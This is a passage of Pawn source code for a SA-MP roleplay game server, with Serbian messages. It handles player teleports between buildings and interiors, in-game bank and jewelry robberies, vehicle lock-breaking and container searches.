				if( IsPlayerInRangeOfPoint( playerid, 2.0, PortOP[ i ][ id ][ Pos1 ][ 0 ], PortOP[ i ][ id ][ Pos1 ][ 1 ], PortOP[ i ][ id ][ Pos1 ][ 2 ] ) && GetPlayerVirtualWorld( playerid ) == PortOP[ i ][ id ][ VW ][ 0 ] && GetPlayerInterior( playerid ) == PortOP[ i ][ id ][ Int ][ 0 ] ) {
				    Novi_SetPlayerPos( playerid, PortOP[ i ][ id ][ Pos2 ][ 0 ], PortOP[ i ][ id ][ Pos2 ][ 1 ], PortOP[ i ][ id ][ Pos2 ][ 2 ] );
				    GameTextForPlayer( playerid, "Ucitavanje ...", 6000, 4 );
				    SetTimerEx("SlobodnoSada", 6000, false, "i", playerid );
			        SetCameraBehindPlayer( playerid );
			        TogglePlayerControllable( playerid, false );
					SetPlayerInterior( playerid, PortOP[ i ][ id ][ Int ][ 1 ] );
					SetPlayerVirtualWorld( playerid, PortOP[ i ][ id ][ VW ][ 1 ] );
				}
				else if( IsPlayerInRangeOfPoint( playerid, 2.0, PortOP[ i ][ id ][ Pos2 ][ 0 ], PortOP[ i ][ id ][ Pos2 ][ 1 ], PortOP[ i ][ id ][ Pos2 ][ 2 ] ) && GetPlayerVirtualWorld( playerid ) == PortOP[ i ][ id ][ VW ][ 1 ] && GetPlayerInterior( playerid ) == PortOP[ i ][ id ][ Int ][ 1 ] ) {
				    Novi_SetPlayerPos( playerid, PortOP[ i ][ id ][ Pos1 ][ 0 ], PortOP[ i ][ id ][ Pos1 ][ 1 ], PortOP[ i ][ id ][ Pos1 ][ 2 ] );
				    GameTextForPlayer( playerid, "Ucitavanje ...", 6000, 4 );
				    SetTimerEx("SlobodnoSada", 6000, false, "i", playerid );
			        SetCameraBehindPlayer( playerid );
			        TogglePlayerControllable( playerid, false );
					SetPlayerInterior( playerid, PortOP[ i ][ id ][ Int ][ 0 ] );
					SetPlayerVirtualWorld( playerid, PortOP[ i ][ id ][ VW ][ 0 ] );
				}
			}
		}
	}
	for( new i= 1; i < MAX_IMOVINA; i++) {

		if( IsPlayerInRangeOfPoint( playerid, 2.0, II[ i ][ iEnter ][ 0 ], II[ i ][ iEnter ][ 1 ], II[ i ][ iEnter ][ 2 ] ) ) {

		    if( II[ i ][ iLocked ] == 0 ) {

                FadeFromBlack( playerid );

				Novi_SetPlayerPos( playerid, II[ i ][ iExit ][ 0 ], II[ i ][ iExit ][ 1 ], II[ i ][ iExit ][ 2 ] );
		  		GameTextForPlayer( playerid, "Ucitavanje ...", 6000, 4 );
			    SetTimerEx( "SlobodnoSada", 6000, false, "i", playerid );
			    SetCameraBehindPlayer( playerid );
		        TogglePlayerControllable( playerid, false );
		    	SetPlayerInterior( playerid, II[ i ][ iInterior ] );
				SetPlayerVirtualWorld( playerid, II[ i ][ iVW ] );
				inProperty[ playerid ] = i;
			}
			else return GameTextForPlayer( playerid, "~r~Zakljucano", 5000, 6 );
		}
		else if( IsPlayerInRangeOfPoint( playerid, 2.0, II[ i ][ iExit ][ 0 ], II[ i ][ iExit ][ 1 ], II[ i ][ iExit ][ 2 ] ) && GetPlayerVirtualWorld( playerid ) == II[ i ][ iVW ] ) {

            FadeFromBlack( playerid );

		    PortajIgraca( playerid, II[ i ][ iEnter ][ 0 ], II[ i ][ iEnter ][ 1 ], II[ i ][ iEnter ][ 2 ] );
		    GameTextForPlayer( playerid, "Ucitavanje ...", 6000, 4 );
		    SetTimerEx("SlobodnoSada", 6000, false, "i", playerid );
	        SetCameraBehindPlayer( playerid );
	        TogglePlayerControllable( playerid, 0);
			SetPlayerInterior( playerid, 0);
			SetPlayerVirtualWorld( playerid, 0);
			inProperty[ playerid ] = -1;
		}
	}
	for( new i = 1; i < MAX_HOTELS; i++) {
	
		if( IsPlayerInRangeOfPoint( playerid, 2.0, hotelInfo[ i ][ hEnter ][ 0 ], hotelInfo[ i ][ hEnter ][ 1 ], hotelInfo[ i ][ hEnter ][ 2 ] ) ) {

		    if( hotelInfo[ i ][ hLocked ] == 0 ) {
            
                FadeFromBlack( playerid );

				Novi_SetPlayerPos( playerid, hotelInfo[ i ][ hExit ][ 0 ], hotelInfo[ i ][ hExit ][ 1 ], hotelInfo[ i ][ hExit ][ 2 ] );
		  		GameTextForPlayer( playerid, "Ucitavanje ...", 6000, 4 );
			    SetTimerEx( "SlobodnoSada", 6000, false, "i", playerid );
			    SetCameraBehindPlayer( playerid );
		        TogglePlayerControllable( playerid, false );
		    	SetPlayerInterior( playerid, hotelInfo[ i ][ hInterior ] );
				SetPlayerVirtualWorld( playerid, hotelInfo[ i ][ hVW ] );
				inHotel[ playerid ] = i;
			}
			else return GameTextForPlayer( playerid, "~r~Zakljucano", 5000, 6 );
		}
		else if( IsPlayerInRangeOfPoint( playerid, 2.0, hotelInfo[ i ][ hExit ][ 0 ], hotelInfo[ i ][ hExit ][ 1 ], hotelInfo[ i ][ hExit ][ 2 ] ) && GetPlayerVirtualWorld( playerid ) == hotelInfo[ i ][ hVW ] ) {

            FadeFromBlack( playerid );

		    PortajIgraca( playerid, hotelInfo[ i ][ hEnter ][ 0 ], hotelInfo[ i ][ hEnter ][ 1 ], hotelInfo[ i ][ hEnter ][ 2 ] );
		    GameTextForPlayer( playerid, "Ucitavanje ...", 6000, 4 );
		    SetTimerEx("SlobodnoSada", 6000, false, "i", playerid );
	        SetCameraBehindPlayer( playerid );
	        TogglePlayerControllable( playerid, 0 );
			SetPlayerInterior( playerid, 0 );
			SetPlayerVirtualWorld( playerid, 0 );
			inHotel[ playerid ] = -1;
		}
	}
	for( new f = 1; f < MAX_BUSSINES; f++) { //OVDE
	
		if( IsPlayerInRangeOfPoint( playerid, 1.0, BussinesInfo[ f ][ bEnterX], BussinesInfo[ f ][ bEnterY], BussinesInfo[ f ][ bEnterZ] ) ) {

			if( BussinesInfo[ f ][ bLocked ] == 1 ) return SendErrorMessage( playerid, "Ova firma je zakljucana!" );
			if( BussinesInfo[ f ][ bProducts ] == 0 ) return SendErrorMessage( playerid, "Izvinite nemamo produkata!" );
	        if( BussinesInfo[ f ][ bType ] == VRSTA_JFIRMA ) return SendErrorMessage( playerid, "Ovde ne mozes uci!!" );
	        else if( BussinesInfo[ f ][ bType ] == VRSTA_TRAFIKA ) return SendErrorMessage( playerid, "Ovde ne mozes uci!!" );
            else if( BussinesInfo[ f ][ bType ] == VRSTA_POSAO ) return SendErrorMessage( playerid, "Ovde ne mozes uci!!" );
            else if( BussinesInfo[ f ][ bType ] == VRSTA_RENT ) return SendErrorMessage( playerid, "Ovde ne mozes uci!!" );
			else if( BussinesInfo[ f ][ bType ] == VRSTA_JAVNAK || BussinesInfo[ f ][ bType ] == VRSTA_KLAD  ) {
			    if( PlayerInfo[ playerid ][ xGodine ] < 18 ) return SendErrorMessage( playerid, "Zabranjen ulaz maloletnicima, samo 18+." );
			}

            FadeFromBlack( playerid );

			Novi_SetPlayerPos( playerid, BussinesInfo[ f ][ bExitX], BussinesInfo[ f ][ bExitY ], BussinesInfo[ f ][ bExitZ ] );
            GameTextForPlayer( playerid, "Ucitavanje ...", 6000, 4 );
		    SetTimerEx( "SlobodnoSada", 6000, false, "i", playerid );
		    SetCameraBehindPlayer( playerid );
	        TogglePlayerControllable( playerid, false );
			SetPlayerInterior( playerid, BussinesInfo[ f ][ bInInt ] );
			SetPlayerVirtualWorld( playerid, BussinesInfo[ f ][ bInVW ] );
		    uFirmi[ playerid ] = f;
            if( BussinesInfo[ f ][ bType ] == VRSTA_GUNSHOP ) {
                
                SendInfoMessage(playerid, "Da kupis oruzije koristi [ /kupi ] ");
            }
			SetPlayerTime( playerid, 12, 0 );
			if( BussinesInfo[ f ][ bType ] == VRSTA_JAVNAK ) {
				SetPlayerTime( playerid, 20, 0 );
			}
		}
		else if( IsPlayerInRangeOfPoint( playerid, 2.0, BussinesInfo[ f ][ bExitX ], BussinesInfo[ f ][ bExitY ], BussinesInfo[ f ][ bExitZ ] ) && GetPlayerVirtualWorld( playerid ) == BussinesInfo[ f ][ bInVW ] ) {

		    if( BussinesInfo[ f ][ bType ] == VRSTA_MARKET ) {
				if(RobMarketKurac{playerid} != 0) 
				{
					SendInfoMessage(playerid, "Napustio si market pre zavrsetka pljacke!");
					PrekinuoRob[playerid] = 1;
                    PlayerInfo[playerid][xRobanjeMarketa] = 20;
					stop TimerRobMarket;
					RobMarketKurac{playerid} = 0;
					PostaviWanted(playerid, "Pljacka Marketa", "Nepoznat", 4 );
				}
			}

            FadeFromBlack( playerid );

			PortajIgraca( playerid, BussinesInfo[ f ][ bEnterX ], BussinesInfo[ f ][ bEnterY ], BussinesInfo[ f ][ bEnterZ ] );
            GameTextForPlayer( playerid, "Ucitavanje ...", 6000, 4 );
		    SetTimerEx( "SlobodnoSada", 6000, false, "i", playerid );
		    SetCameraBehindPlayer( playerid );
	        TogglePlayerControllable( playerid, false );
			SetPlayerInterior( playerid, BussinesInfo[ f ][ bInt ] );
		    SetPlayerVirtualWorld( playerid, BussinesInfo[ f ][ bVW ] );
		    uFirmi[ playerid ] = -1;
		    SetPlayerTime( playerid, ServerInfo[ VremeInGame ], 0 );
		}
	}

    if(IsPlayerInRangeOfPoint(playerid, 3.0, 998.3815,1888.8075,1202.2400) && !IsPlayerInAnyVehicle(playerid)) //Kanalizacija 
    {
        
        FadeFromBlack( playerid );

        SetTimerEx("SlobodnoSada", 6000, false, "i", playerid);
        GameTextForPlayer( playerid, "Ucitavanje ...", 6000, 4 );
        TogglePlayerControllable( playerid, false);
        SetPlayerVirtualWorld( playerid, 0 );
        SetPlayerInterior( playerid, 0);
        Novi_SetPlayerPos( playerid, -792.9580,-647.8305,1107.0656);
        SetCameraBehindPlayer( playerid );
        return 1;
    }

    if(IsPlayerInRangeOfPoint(playerid, 3.0, -921.1987,-920.5673,1107.0656) && !IsPlayerInAnyVehicle(playerid)) //Kanalizacija 
    {
        
        SPD(playerid, dialog_SahteOdabir, DIALOG_STYLE_LIST, "Sahte Odabir", "Sahta 1\nSahta 2\nSahta 3\nSahta 4\nSahta 5\nSahta 6", "Potvrdi", "Odustani");
        return 1;
    }

	for( new i; i < MAX_INTERIJERA; i++) {
	
		if( IsPlayerInRangeOfPoint( playerid, 1.5, IntInfo[ i ][iXUlaz], IntInfo[ i ][iYUlaz], IntInfo[ i ][iZUlaz]) && GetPlayerVirtualWorld( playerid ) == IntInfo[ i ][iVwIDSpolja] && !IsPlayerInAnyVehicle( playerid )) {

            FadeFromBlack( playerid );

			SetPlayerInterior( playerid, IntInfo[ i ][iIntID] );
			SetPlayerVirtualWorld( playerid, IntInfo[ i ][iVwID] );
			Novi_SetPlayerPos( playerid, IntInfo[ i ][iXIzlaz], IntInfo[ i ][iYIzlaz], IntInfo[ i ][iZIzlaz] );
			SetPlayerFacingAngle( playerid, IntInfo[ i ][iAIzlaz] );
			SetCameraBehindPlayer( playerid );
			SetTimerEx("SlobodnoSada", 3000, false, "i", playerid);
			GameTextForPlayer( playerid, "Ucitavanje ...", 3000, 4 );
			TogglePlayerControllable( playerid, false);
			SetPlayerTime( playerid, 12, 0 );
		    uInterijeru[ playerid ] = i;

            if(!strcmp(IntInfo[i][iIme], "Banka")) {

                UBanci[playerid] = true;
                return 1;
            }	
		}
		else if( IsPlayerInRangeOfPoint( playerid, 1.5, IntInfo[ i ][iXIzlaz], IntInfo[ i ][iYIzlaz], IntInfo[ i ][iZIzlaz]) && GetPlayerVirtualWorld( playerid ) == IntInfo[ i ][iVwID]) {

            FadeFromBlack( playerid );

		    SetTimerEx("SlobodnoSada", 6000, false, "i", playerid);
		    GameTextForPlayer( playerid, "Ucitavanje ...", 6000, 4 );
		    TogglePlayerControllable( playerid, false);
		    SetPlayerVirtualWorld( playerid, IntInfo[ i ][iVwIDSpolja] );
		    SetPlayerInterior( playerid, IntInfo[ i ][iIntIDSpolja] );
		    PortajIgraca( playerid, IntInfo[ i ][iXUlaz], IntInfo[ i ][iYUlaz], IntInfo[ i ][iZUlaz] );
		    SetPlayerFacingAngle( playerid, IntInfo[ i ][iAUlaz] );
		    SetCameraBehindPlayer( playerid );
		    SetPlayerTime( playerid, ServerInfo[ VremeInGame ], 0 );
		    uInterijeru[ playerid ] = -1;

            if(!strcmp(IntInfo[i][iIme], "Banka")) {

                UBanci[playerid] = false;

                if(RobaBanku[playerid]) {

                    stop TimerRobBanka;

                    UnistiBusilicu();

                    BankaBusilicaTDSakrij(playerid);

                    PostaviBusilicu[playerid] = false;
                    BusilicaTime[playerid] = 0;
                    BankaUToku = false;
                    BankaOrobana = true;
                    RobaBanku[playerid] = false;
                    PokupiTorbu[playerid] = false;

                    defer SledeciRobBanke();

                    SendErrorMessage(playerid, "Napustio si banku i rob se prekinuo!");

                    SCMTA(-1, ""SRVBOJA1SCM"====================================="col_white" [ VANDREDNE VESTI ] "SRVBOJA1SCM"=====================================");
                    SCMTA(-1, ""SRVBOJA1SCM"REPORTER: "col_white"Obavestavamo gradjane da je policija uspesno sprecila pljacku "SRVBOJA1SCM"BANKE"col_white"!");
                    SCMTA(-1, ""SRVBOJA1SCM"REPORTER: "col_white"Za svoje dobro delo, grad ih nagradjuje novcanom nagradom od "SRVBOJA1SCM"15.000$"col_white" svakom clanu Policije!");
                    SCMTA(-1, ""SRVBOJA1SCM"===============================================================================================================");

                    foreach( Player, k ) {

                        if( IsPlayerConnected( k ) ) {
                            
                            if(ClanPolicije(k) && !isPlayerAFK(k)) {
                                DajIgracuNovac(k, 15000);
                                SendInfoMessage(k, "Za uspesno sprecavanje pljacke dobio si 15.000$!");
                            }
                        }
                    }

                }

                return 1;
            }
		}
    }
    if( IsPlayerInRangeOfPoint( playerid, 1.5, 1924.3861, -1524.3082, 2429.4849 ) ) { // CNN Studio
    
        FadeFromBlack( playerid );
    
		SetCameraBehindPlayer( playerid );
        SetTimerEx("SlobodnoSada", 6000, false, "i", playerid);
	    GameTextForPlayer( playerid, "Ucitavanje ...", 6000, 4 );
	    TogglePlayerControllable( playerid, false );
	    SetPlayerInterior( playerid, 3 );
    	SetPlayerVirtualWorld( playerid, 3 );
      	Novi_SetPlayerPos( playerid, 1917.1879, -1533.8624, 2429.4897 );
	}
	if( IsPlayerInRangeOfPoint( playerid, 1.5, 1524.6689, -1726.9661, -60.5881 ) ) { // PD KROV
	
 	    if( GetFactionType( playerid ) == ORG_TIP_PD ) {
 	    
			SetCameraBehindPlayer( playerid );
	        SetTimerEx("SlobodnoSada", 6000, false, "i", playerid);
		    GameTextForPlayer( playerid, "Ucitavanje ...", 6000, 4 );
		    TogglePlayerControllable( playerid, false );
		    SetPlayerInterior( playerid, 0 );
	    	SetPlayerVirtualWorld( playerid, 0 );
	      	Novi_SetPlayerPos( playerid, 1564.8328, -1666.9375, 28.3956 );
		}
	}
	if( IsPlayerInRangeOfPoint( playerid, 1.5, 1879.1925,2339.4995,10.9799 ) ) { // Heki helipad
		SetCameraBehindPlayer( playerid );
	    SetPlayerInterior( playerid, 0 );
    	SetPlayerVirtualWorld( playerid, 0 );
      	Novi_SetPlayerPos( playerid, 1871.5922,2332.8225,14.7813 );
	}
	if( IsPlayerInRangeOfPoint( playerid, 1.5, 1871.5922,2332.8225,14.7813 ) ) { // Heki helipad
		SetCameraBehindPlayer( playerid );
	    SetPlayerInterior( playerid, 0 );
	   	SetPlayerVirtualWorld( playerid, 0 );
	   	Novi_SetPlayerPos( playerid, 1879.1925,2339.4995,10.9799 );
	}
	if( IsPlayerInRangeOfPoint( playerid, 1.5, 1533.1113, -1736.2327, -64.0829 ) ) { // PD GARAZA
	    if( GetFactionType( playerid ) == ORG_TIP_PD ) {
			SetCameraBehindPlayer( playerid );
	        SetTimerEx("SlobodnoSada", 6000, false, "i", playerid);
		    GameTextForPlayer( playerid, "Ucitavanje ...", 6000, 4 );
		    TogglePlayerControllable( playerid, false );
		    SetPlayerInterior( playerid, 0 );
	    	SetPlayerVirtualWorld( playerid, 0 );
	      	Novi_SetPlayerPos( playerid, 1524.4833, -1677.7874, 6.2188 );
		}
	}
	if( IsPlayerInRangeOfPoint(playerid, 1.5, 1564.8328, -1666.9375, 28.3956 ) ) { //// PD KROV
	    if( GetFactionType( playerid ) == ORG_TIP_PD ) {
		    SetCameraBehindPlayer(playerid);
	        SetTimerEx("SlobodnoSada", 6000, false, "i", playerid);
		    GameTextForPlayer( playerid, "Ucitavanje ...", 6000, 4 );
		    TogglePlayerControllable( playerid, false );
		    SetPlayerInterior( playerid, 3 );
	     	SetPlayerVirtualWorld( playerid, 3 );
	      	Novi_SetPlayerPos( playerid, 1524.6689, -1726.9661, -60.5881 );
      	}
	}
	if( IsPlayerInRangeOfPoint(playerid, 1.5, 1524.4833, -1677.7874, 6.2188 ) ) { // PD GARAZA
	    if( GetFactionType( playerid ) == ORG_TIP_PD ) {
		    SetCameraBehindPlayer(playerid);
	        SetTimerEx("SlobodnoSada", 6000, false, "i", playerid);
		    GameTextForPlayer( playerid, "Ucitavanje ...", 6000, 4 );
		    TogglePlayerControllable( playerid, false );
		    SetPlayerInterior( playerid, 3 );
	     	SetPlayerVirtualWorld( playerid, 3 );
	      	Novi_SetPlayerPos( playerid, 1533.1113, -1736.2327, -64.0829 );
		}
	}
	
	if( IsPlayerInRangeOfPoint( playerid, 3.0, 1700.5277, -1667.7759, 20.2188 ) ) { // AFK Zona
	
		SetCameraBehindPlayer( playerid );
        SetTimerEx("SlobodnoSada", 6000, false, "i", playerid );
	    GameTextForPlayer( playerid, "Ucitavanje ...", 6000, 4 );
	    TogglePlayerControllable( playerid, false );
	    SetPlayerVirtualWorld( playerid, 0 );
		SetPlayerInterior( playerid, 0 );
		Novi_SetPlayerPos( playerid, 1471.4055, -1178.0507, 23.9228 );
	}
	
	if( IsPlayerInRangeOfPoint( playerid, 3.0, 1471.4055, -1178.0507, 23.9228 ) ) { // AFK Zona
		if( PlayerInfo[ playerid ][ xWanted ] == 0 ) {
	        antiCheatCS[ playerid ][ TeleportCheck ] = 4;

		    new rand = random( sizeof( RandomAFKZone ) );
			Novi_SetPlayerPos( playerid, RandomAFKZone[ rand ][ 0 ], RandomAFKZone[ rand ][ 1 ], RandomAFKZone[ rand ][ 2 ] );
			SetTimerEx( "SlobodnoSada", 6000, false, "i", playerid );
			GameTextForPlayer( playerid, "Ucitavanje ...", 6000, 4 );
			TogglePlayerControllable( playerid, false );
			SetCameraBehindPlayer( playerid );
			SetPlayerInterior( playerid, 18 );
			SetPlayerVirtualWorld( playerid, 0 );
		}
		else return SendErrorMessage( playerid, "Ne mozete sa wantedom u AFK zonu." );
	}
	
	if( IsPlayerInRangeOfPoint(playerid, 1.5, 1917.1879, -1533.8624, 2429.4897 ) ) { // CNN Studio
	    SetCameraBehindPlayer(playerid);
        SetTimerEx("SlobodnoSada", 6000, false, "i", playerid);
	    GameTextForPlayer( playerid, "Ucitavanje ...", 6000, 4 );
	    TogglePlayerControllable( playerid, false );
	    SetPlayerInterior( playerid, 3 );
     	SetPlayerVirtualWorld( playerid, 3 );
      	Novi_SetPlayerPos( playerid, 1924.3861, -1524.3082, 2429.4849 );
	}

    if(IsPlayerInRangeOfPoint(playerid, 2.0, 1133.3093,-1679.9972,-18.4852)) {

        SetCameraBehindPlayer( playerid );
        SetPlayerVirtualWorld( playerid, 0 );
        SetPlayerInterior( playerid, 0 );
        Novi_SetPlayerPos( playerid, 1460.341430, -1720.988769, 6.866373);
    }

    if( IsPlayerInRangeOfPoint( playerid, 2.0, 2141.4316,-1187.8953,23.9921) ) { //AutoSalon ulaz

        SetCameraBehindPlayer( playerid );
        SetPlayerVirtualWorld( playerid, 0 );
        SetPlayerInterior( playerid, 0 );
        Novi_SetPlayerPos( playerid, 2136.8862,-1188.0598,24.0499);
    }

    if( IsPlayerInRangeOfPoint( playerid, 2.0, 2136.8862,-1188.0598,24.0499) ) { //AutoSalon izlaz

        SetCameraBehindPlayer( playerid );
        SetPlayerVirtualWorld( playerid, 0 );
        SetPlayerInterior( playerid, 0 );
        Novi_SetPlayerPos( playerid, 2141.4316,-1187.8953,23.9921);
    }

    if( IsPlayerInRangeOfPoint( playerid, 2.0, 1081.2454,-1696.7845,13.5469) ) { //Zlatara ulaz

        SetCameraBehindPlayer( playerid );
        SetPlayerVirtualWorld( playerid, 0 );
        SetPlayerInterior( playerid, 0 );
        Novi_SetPlayerPos( playerid, 1081.2563,-1694.9634,13.5750 );
    }
    if( IsPlayerInRangeOfPoint( playerid, 2.0, 1081.2563,-1694.9634,13.5750)) {

        if(RobaZlataru[playerid]) {

            stop TimerRobZlatara;

            UnistiBusilicuZlatara();

            PostaviBusilicuZlatara[playerid] = false;
            BusilicaTimeZlatara[playerid] = 0;
            ZlataraRobUToku = false;
            ZlataraOrobana = true;
            RobaZlataru[playerid] = false;
            PokupiTorbuZlatara[playerid] = false;
            PostaviBusilicuZlatara[playerid] = false;

            defer SledeciRobZlatare();

            SendErrorMessage(playerid, "Napustio si zlataru i rob se prekinuo!");

            SendClientMessageToAll(0xFF0000FF, "(ZLATARA ROB) "col_white"Obavestavamo gradjane da je policija sprecila pljacku zlatare!");

        }

        SetCameraBehindPlayer( playerid );
        SetPlayerVirtualWorld( playerid, 0 );
        SetPlayerInterior( playerid, 0 );
        Novi_SetPlayerPos( playerid, 1081.2454,-1696.7845,13.5469);
    }
	if( IsPlayerInRangeOfPoint( playerid, 2.0, 1673.9718, 1967.7209, 10.8203 ) ) { // Promoter
        if( PlayerInfo[ playerid ][ xPromoter ] >= 1 || PlayerInfo[ playerid ][ xSupporter ] >= 1 || PlayerInfo[ playerid ][ xAdmin ] >= 1 ) {
			SetCameraBehindPlayer( playerid );
	    	SetPlayerVirtualWorld( playerid, 0 );
	    	SetPlayerInterior( playerid, 12 );
      		Novi_SetPlayerPos( playerid, 2324.4663, -1149.5472, 1050.7101 );
		}
		else return GameTextForPlayer( playerid, "~r~Zakljucano", 5000, 6 );
	}
	if( IsPlayerInRangeOfPoint( playerid, 2.0, 2324.4663, -1149.5472, 1050.7101 ) ) { // Promoter
        if( PlayerInfo[ playerid ][ xPromoter ] >= 1 || PlayerInfo[ playerid ][ xSupporter ] >= 1 || PlayerInfo[ playerid ][ xAdmin ] >= 1 ) {
			SetCameraBehindPlayer( playerid );
	    	SetPlayerVirtualWorld( playerid, 0 );
	    	SetPlayerInterior( playerid, 0 );
      		Novi_SetPlayerPos( playerid, 1673.9718, 1967.7209, 10.8203 );
		}
		else return GameTextForPlayer( playerid, "~r~Zakljucano", 5000, 6 );
	}
	
	
	if( IsPlayerInRangeOfPoint( playerid, 2.0, 602.1806, 867.9139, -42.9609 ) ) { // Rudnik
        if( PlayerInfo[ playerid ][ xPosao ] == POSAO_RUDAR || PlayerInfo[ playerid ][ xSupporter ] >= 1 || PlayerInfo[ playerid ][ xAdmin ] >= 1 ) {
	    	SetPlayerVirtualWorld( playerid, 1 );
	    	SetPlayerInterior( playerid, 1 );
      		Novi_SetPlayerPos( playerid, 957.3918, 388.6608, -33.2690 );
      		SetCameraBehindPlayer( playerid );
		}
		else return GameTextForPlayer( playerid, "~r~Zakljucano", 5000, 6 );
	}
	if( IsPlayerInRangeOfPoint( playerid, 2.0, 957.3918, 388.6608, -33.2690 ) ) { // Rudnik
        if( PlayerInfo[ playerid ][ xPosao ] == POSAO_RUDAR || PlayerInfo[ playerid ][ xSupporter ] >= 1 || PlayerInfo[ playerid ][ xAdmin ] >= 1 ) {
	    	SetPlayerVirtualWorld( playerid, 0 );
	    	SetPlayerInterior( playerid, 0 );
      		Novi_SetPlayerPos( playerid, 602.1806, 867.9139, -42.9609 );
      		SetCameraBehindPlayer( playerid );
		}
		else return GameTextForPlayer( playerid, "~r~Zakljucano", 5000, 6 );
	}
	return true;
}
//------------------------------------------------------------------------------
public split(const strsrc[], strdest[][], delimiter)
{
	new i, li;
	new aNum;
	new len;
	while(i <= strlen(strsrc)){
	    if(strsrc[ i ]==delimiter || i==strlen(strsrc)){
	        len = strmid(strdest[aNum], strsrc, li, i, 128);
	        strdest[aNum][len] = 0;
	        li = i+1;
	        aNum++;
		}
		i++;
	}
	return 1;
}
//------------------------------------------------------------------------------
public ImmobCountForPlayer( playerid )
{
	if(GetPVarInt( playerid, "immobsecounds"))
	{
	    new immobstring[ 34 ];
	    format( immobstring,sizeof( immobstring ),"~w~Preostalo sekundi: ~g~%d", GetPVarInt(playerid, "immobsecounds")-1);
        GameTextForPlayer( playerid, immobstring, 1100, 4 );
        PlayerPlaySound( playerid, 1056, 0.0, 0.0, 0.0 );

        PovecajPVarInt(playerid, "immobsecounds", -1);

        if(!GetPVarInt(playerid, "immobsecounds"))
        {
			Novi_KillTimer(GetPVarInt(playerid, "immobcounttimer"));
		}
	}
}

public BreakLockCountForPlayer( playerid )
{
	new Float:X, Float:Y, Float:Z;
	GetVehiclePos( GetPVarInt( playerid, "BreakingVehicle"), X, Y, Z );
	if(!IsPlayerInRangeOfPoint( playerid, 3.0, X, Y, Z ) )
	{
		TogglePlayerControllable( playerid, 1 );

		Novi_KillTimer( GetPVarInt( playerid, "BreakLockTimer" ) );
		Novi_KillTimer( GetPVarInt( playerid, "breakcounttimer" ) );
		SetPVarInt( playerid, "BreakLockTimerCalled", 0 );
		SetPVarInt( playerid, "BreakingLock", 0 );

		SendErrorMessage( playerid, "Vozilo u koje pokusavate provaliti nije blizu vas." );
	}
	if(GetPVarInt(playerid, "breaksecounds"))
	{
	    new breakstring[ 34 ];
	    format( breakstring,sizeof( breakstring ),"~w~Preostalo sekundi: ~g~%d", GetPVarInt( playerid, "breaksecounds" )-1 );
        GameTextForPlayer( playerid, breakstring, 1100, 4 );
        PlayerPlaySound( playerid, 1056, 0.0, 0.0, 0.0 );

        PovecajPVarInt( playerid, "breaksecounds", -1 );

        if(!GetPVarInt( playerid, "breaksecounds" ) )
        {
			Novi_KillTimer( GetPVarInt( playerid, "breakcounttimer" ) );
		}
	}
}
public VehicleBreakLock( playerid, vehicleid, autoid ) {
    if( IsPlayerConnected( playerid ) )
    {
		SetPVarInt( playerid, "BreakingLock", 0 );
		GameTextForPlayer( playerid, "~w~Vozilo ~g~otkljucano", 5000, 6 );
		PlayerPlaySound( playerid, 1145, 0.0, 0.0, 0.0);
		VehicleInfo[ autoid ][ vLocked ] = 0;
		TogglePlayerControllable( playerid, true );
		UnLockCar( vehicleid );
    }
}
//------------------------------------------------------------------------------
public TrashLimitOff( playerid ) {
    if( GetNearestContainer( playerid ) == -1 ) return SendErrorMessage( playerid, "Otisao si od kontejnera i nisi nasao nista." );
    new rands = random( 4 )+1;
    switch( rands ) {
        case 1: {
            if( Maskuse[ playerid ] == true )
	    		format( globalstring, sizeof( globalstring ), "** Alat za obijanje je nadjen u kontejneru (( Maska_%d ))", PlayerInfo[ playerid ][ xMaskID ] );
			else
                format( globalstring, sizeof( globalstring ), "** Alat za obijanje je nadjen u kontejneru (( %s ))", ImeIgraca( playerid ) );
			PlayerInfo[ playerid ][ xToolkit ] = true;
		}
		case 2: {
            if( Maskuse[ playerid ] == true )
	    		format( globalstring, sizeof( globalstring ), "** Upaljac je nadjen u kontejneru (( Maska_%d ))", PlayerInfo[ playerid ][ xMaskID ] );
			else
                format( globalstring, sizeof( globalstring ), "** Upaljac je nadjen u kontejneru (( %s ))", ImeIgraca( playerid ) );
			PlayerInfo[ playerid ][ xUpaljac ] = 1;
		}
		case 3: {
            if( Maskuse[ playerid ] == true )
	    		format( globalstring, sizeof( globalstring ), "** Spric sa iglom je nadjen u kontejneru (( Maska_%d ))", PlayerInfo[ playerid ][ xMaskID ] );
			else
                format( globalstring, sizeof( globalstring ), "** Spric sa iglom je nadjen u kontejneru (( %s ))", ImeIgraca( playerid ) );
			PlayerInfo[ playerid ][ xInekcija ] = true;
		}
		case 4: {
            if( Maskuse[ playerid ] == true )
	    		format( globalstring, sizeof( globalstring ), "** Uze je nadjeno u kontejneru (( Maska_%d ))", PlayerInfo[ playerid ][ xMaskID ] );
			else
                format( globalstring, sizeof( globalstring ), "** Uze je nadjeno u kontejneru (( %s ))", ImeIgraca( playerid ) );
			Uze[ playerid ] = true;
		}
		case 5: {
            if( Maskuse[ playerid ] == true )
	    		format( globalstring, sizeof( globalstring ), "** Sat je nadjen u kontejneru (( Maska_%d ))", PlayerInfo[ playerid ][ xMaskID ] );
			else
                format( globalstring, sizeof( globalstring ), "** Sat je nadjen u kontejneru (( %s ))", ImeIgraca( playerid ) );
			PlayerInfo[ playerid ][ xSat ] = 19039;
		}
	}
	PorukaRadius( 20.0, playerid, globalstring, LJUBICASTA );
	TrashSearch[ playerid ] = 0;
	VremeTDControl( playerid, false );
	ClearAnimations( playerid );
	TogglePlayerControllable( playerid, true );
	return 1;
}

//------------------------------------------------------------------------------
//------------------------------------------------------------------------------
//------------------------------------------------------------------------------

public OnPlayerCrashVehicle(playerid, vehicleid, Float:damage) {

    if(GetPlayerState(playerid) == PLAYER_STATE_DRIVER && !Pojas[playerid]) {

        if(AdminDuty[playerid]) return 0;
        if(PlayerCP[playerid] > 0) return 0;

        //if(damage >= 100 && damage <= 250) { SetPlayerDrunkLevel (playerid, 10000); drunkTime[playerid] = 3; defer resetDrunkLevel(playerid); }
        if(damage >= 251 && damage <= 500) { SetPlayerDrunkLevel (playerid, 10000); drunkTime[playerid] = 2; defer resetDrunkLevel(playerid); }
        else if(damage >= 501) { SetPlayerDrunkLevel (playerid, 10000); drunkTime[playerid] = 4; defer resetDrunkLevel(playerid); }

    }

    return 1;
}

timer resetDrunkLevel[1000](playerid) {

    if(drunkTime[playerid] != 0) {

        drunkTime[playerid]--;
        defer resetDrunkLevel(playerid);
        return 1;
    }
    else return SetPlayerDrunkLevel(playerid, 0);
}

public OnVehicleDamageStatusUpdate( vehicleid, playerid ) {

